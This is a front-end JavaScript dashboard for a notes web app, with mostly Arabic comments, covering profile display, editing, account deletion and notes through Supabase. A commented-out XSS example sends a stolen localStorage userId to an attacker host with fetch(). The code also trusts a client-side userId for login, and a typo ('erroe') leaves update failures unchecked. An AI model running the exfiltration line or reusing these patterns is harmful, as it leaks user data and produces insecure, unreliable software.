// المتغيرات
const welcomeMsg = document.getElementById("welcome-msg");
const userName = document.getElementById("user-name");
const userEmail = document.getElementById("user-email");
const userAge = document.getElementById("user-age");
const userPhone = document.getElementById("user-phone");
const LogoutBtn = document.getElementById("btn-logout");
// notes var
const noteInput = document.getElementById("note-input");
const notesList = document.getElementById("notes-list");

// اقسام الصفحة
const viewSection = document.getElementById("view-section");
const editSection = document.getElementById("edit-section");
// Update in db
const editName = document.getElementById("edit-name");
const editAge = document.getElementById("edit-age");
const editPhone = document.getElementById("edit-phone");
// الازرار
const editBtn = document.getElementById("btn-edit");
const saveBtn = document.getElementById("btn-save");
const cancelBtn = document.getElementById("btn-cancel");
const deleteBtn = document.getElementById("btn-delete");
// notes var
const addNoteBtn = document.getElementById("btn-add-note");

// تخزين بيانات المستخدم الحالية
let currentUser = null;
let currentUserId = null;

//Event Listeners
editBtn.addEventListener("click", openEditMode);
cancelBtn.addEventListener("click", cancelEditMode);
saveBtn.addEventListener("click", updateUserData);
deleteBtn.addEventListener("click", deleteUser);
LogoutBtn.addEventListener("click", logout);
addNoteBtn.addEventListener("click", addNote);

initDashboard();

async function initDashboard() {
  currentUserId = checkLogin();
  if (currentUserId) {
    await loadUserData(currentUserId);
    await loadNotes(currentUserId);
  }
}

// داله التحقق وحمايه الصفحة
function checkLogin() {
  const userId = localStorage.getItem("userId");
  if (!userId) {
    window.location.href = "login.html";
    return null;
  }
  return userId;
}

function logout() {
  localStorage.removeItem("userId");
  alert("تم تسجيل الخروج");
  window.location.href = "index.html";
}

// داله عرض البيانات ولو البييانات غير صحيحه رجع المستخدم لصفحه الاندكس
async function loadUserData(userId) {
  const { data, error } = await supabaseClient
    .from("users")
    .select("*")
    .eq("userId", userId)
    .single();

  if (error || !data) {
    alert("حدث خطأ في تحميل البيانات");
    logout();
    return;
  }

  currentUser = data;
  showUserData(data);
}

function showUserData(user) {
  welcomeMsg.textContent = `مرحبا بك يا ${user.name}`;
  userName.textContent = user.name;
  userEmail.textContent = user.email;
  userAge.textContent = user.age;
  userPhone.textContent = user.phone;
}

// XSS Cross-Site-scripting
// const stolenData = localStorage.getItem("userID")
// fetch("https://attacker.com/steal?data=" + stolenData)

function openEditMode() {
  editName.value = currentUser.name;
  editAge.value = currentUser.age;
  editPhone.value = currentUser.phone;

  viewSection.style.display = "none";
  editSection.style.display = "block";
}

function cancelEditMode() {
  editSection.style.display = "none";
  viewSection.style.display = "block";
}

async function updateUserData() {
  const newName = editName.value.trim();
  const newAge = editAge.value.trim();
  const newPhone = editPhone.value.trim();

  if (newName === "" || newAge === "" || newPhone === "") {
    alert("ادخل البيانات كامله");
    return;
  }
  // updata data in db

  const { erroe } = await supabaseClient
    .from("users")
    .update({
      name: newName,
      age: newAge,
      phone: newPhone,
    })
    .eq("userId", currentUserId);

  if (erroe) {
    // message for dev
    alert("فشل التحديث" + erroe.message);
    return;
  }

  alert("تم تحديث البيانات");

  await loadUserData(currentUserId);
  cancelEditMode();
}

//.update({name: "ali",age:"ahmed",phone: 0102538852,})

async function deleteUser() {
  const confirmed = confirm("هل تريد حزف الحساب نهائيا ؟");
  if (!confirmed) return;

  const { error } = await supabaseClient
    .from("users")
    .delete()
    .eq("userId", currentUserId);

  if (error) {
    alert("فشل الحزف" + error.message);
  }

  localStorage.removeItem("userId");
  alert("تم حزف الحساب");
  window.location.href = "index.html";
}

async function addNote() {
  const content = noteInput.value.trim();

  if (content === "") {
    alert("اكتب ملاحظتك اولا");
    return;
  }

  const { data, error } = await supabaseClient
    .from("notes")
    .insert([
      {
        userId: currentUserId,
        content: content,
      },
    ])
    .select(); // ترجع الid

  if (error) {
    alert("فشل الاضافه" + error.message);
    return;
  }

  noteInput.value = "";

  alert("تم اضافة الملاحظات بنجاح");

  // ul   اضافة الملاحظات الى
  renderNote(data[0]);
}

function renderNote(note) {
  const li = document.createElement("li");
  li.style.marginBottom = "10px";
  // عرض الملاحظه
  const span = document.createElement("span");
  span.textContent = note.content + " ";

  // زر التعديل
  const editNoteBtn = document.createElement("button");
  editNoteBtn.textContent = "تعديل";
  editNoteBtn.onclick = function () {
    updateNote(note.id, span); // id هنمرر الملاحظه بناء على ال
  };

  // حزف الملاحظه
  const deleteNoteBtn = document.createElement("button");
  deleteNoteBtn.textContent = "حذف";
  deleteNoteBtn.style.color = "red";
  deleteNoteBtn.style.marginRight = "5px";
  deleteNoteBtn.onclick = function () {
    deleteNote(note.id, li); // id هنمرر الملاحظه بناء على ال
  };

  li.appendChild(span);
  li.appendChild(editNoteBtn);
  li.appendChild(deleteNoteBtn);
  notesList.appendChild(li);
}

async function loadNotes(userId) {
  const { data, error } = await supabaseClient
    .from("notes")
    .select("*")
    .eq("userId", userId);

  if (error) {
    alert("حدث خطأ في تحميل الملاحظات" + error.message);
    return;
  }

  notesList.innerHTML = "";
  for (let i = 0; i < data.length; i++) {
    renderNote(data[i]);
  }
}


